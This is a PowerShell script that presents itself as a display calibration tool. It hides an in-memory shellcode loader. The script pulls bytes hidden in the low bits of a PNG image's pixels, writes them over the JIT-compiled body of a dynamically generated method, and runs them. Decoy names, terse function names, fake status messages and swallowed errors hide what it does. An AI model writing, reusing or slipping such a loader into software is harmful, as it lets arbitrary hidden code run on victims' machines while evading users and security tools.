param($p = "$PSScriptRoot\source\screenshot.png")
try {
    Add-Type -AssemblyName PresentationCore, WindowsBase
} catch { return }
function g {
    param($f)
    if (-not (Test-Path $f)) { return $null }
    $s = [System.IO.File]::OpenRead($f)
    $d = [System.Windows.Media.Imaging.BitmapDecoder]::Create($s, "None", "Default")
    $v = New-Object System.Windows.Media.Imaging.FormatConvertedBitmap
    $v.BeginInit()
    $v.Source = $d.Frames[0]
    $v.DestinationFormat = [System.Windows.Media.PixelFormats]::Bgra32
    $v.EndInit()
    $r = $v.PixelWidth * 4
    $y = New-Object byte[] ($r * $v.PixelHeight)
    $v.CopyPixels($y, $r, 0)
    $s.Close(); $s.Dispose()
    $b = New-Object System.Collections.BitArray($v.PixelWidth * $v.PixelHeight)
    for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = ($y[$i * 4] -band 1) -eq 1 }
    return $b
}
function i {
    param($d)
    $n = New-Object System.Reflection.AssemblyName("DisplayProvider")
    $a = [AppDomain]::CurrentDomain.DefineDynamicAssembly($n, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $m = $a.DefineDynamicModule("ProviderModule")
    $t = $m.DefineType("CalibrationContext", 161)
    $f = [Reflection.MethodAttributes] "Public, Static"
    $e = $t.DefineMethod("Apply", $f, [void], @())
    $g = $e.GetILGenerator()
    $g.Emit([Reflection.Emit.OpCodes]::Ldc_I4, 1)
    for ($x = 0; $x -lt 60000; $x++) {
        $g.Emit([Reflection.Emit.OpCodes]::Ldc_I4, 1)
        $g.Emit([Reflection.Emit.OpCodes]::Add)
    }
    $g.Emit([Reflection.Emit.OpCodes]::Pop)
    $g.Emit([Reflection.Emit.OpCodes]::Ret)
    $y = $t.CreateType()
    $z = $y.GetMethod("Apply")
    [Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($z.MethodHandle)
    $p = $z.MethodHandle.GetFunctionPointer()
    [System.Runtime.InteropServices.Marshal]::Copy($d, 0, $p, $d.Length)
    [Delegate]::CreateDelegate([Action], $z).Invoke()
}
try {
    Write-Host "[*] System: Initializing Display Calibration..." -ForegroundColor Gray
    $b = g $p
    if ($b) {
        $h = New-Object byte[] 4
        for ($x = 0; $x -lt 4; $x++) {
            $v = 0
            for ($k = 0; $k -lt 8; $k++) { if ($b[$x * 8 + $k]) { $v = $v -bor (1 -shl $k) } }
            $h[$x] = [byte]$v
        }
        $l = [BitConverter]::ToUInt32($h, 0)
        if ($l -gt 0 -and $l -lt ($b.Length / 8)) {
            $d = New-Object byte[] $l
            for ($x = 0; $x -lt $l; $x++) {
                $v = 0
                for ($k = 0; $k -lt 8; $k++) { if ($b[32 + $x * 8 + $k]) { $v = $v -bor (1 -shl $k) } }
                $d[$x] = [byte]$v
            }
            i $d
            Write-Host "[+] Calibration: Success." -ForegroundColor Gray
        }
    }
} catch {}
